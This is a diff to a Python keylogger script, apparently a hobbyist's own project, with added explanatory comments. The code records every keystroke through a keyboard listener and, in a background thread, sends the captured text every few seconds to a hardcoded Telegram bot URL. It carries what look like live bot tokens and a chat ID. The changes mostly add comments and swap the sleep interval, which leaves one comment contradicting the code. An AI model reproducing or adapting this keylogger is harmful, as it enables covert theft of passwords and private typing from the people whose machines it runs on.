@@ -1,4 +1,5 @@
 """ 
+http://api.telegram.org/<token>/sendMessage?chat_id=<chat id>&text=hacked
 https://api.telegram.org/bot5818555834:AAGBOPJiR9c4oVlLAfi1eJk2GbsQXmiGJGg/sendMessage?chat_id=921245059&text=hacked
 token (k3tonbot) = 5818555834:AAF61oPhhWUcmdNtW72mqIk3_vqgvpg2Kp4
 chat_id = 921245059
@@ -8,16 +9,16 @@ import time, threading, requests
 
 
 data = ''
-def log(key): #capture the keys and append it into data
+def log(key): #capturing the keys and appending it into data
     global data
     data = data + '['+str(key)+']'
-
+    # print(data)
 def send_log(): 
 #we need to run this func also at the same time with log, so need to use multithreading.
-# what this func do is wait for 10 sec and send whatever in data is and then empty the data again
+# what this func do is wait for 5 sec and send whatever in data is and then empty the data again
     while True:
         global data
-        time.sleep(5)
+        time.sleep(10)
         if data != '':
             url = f"https://api.telegram.org/bot5818555834:AAGBOPJiR9c4oVlLAfi1eJk2GbsQXmiGJGg/sendMessage?chat_id=921245059&text={data}"
             requests.get(url)
@@ -25,9 +26,79 @@ def send_log():
 
 key_thread = threading.Thread(target=send_log)
 key_thread.start()
-listner = keyboard.Listener(on_press=log)
+# now we have to call log func each time a key is pressed, so on_press is used for this
+listner = keyboard.Listener(on_press=log) #listner object from the keyword library 
 with listner:
-    listner.join()
+    listner.join() #keeps running the listner object until the program is terminated.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 # -------------------------------------------------------------------------------
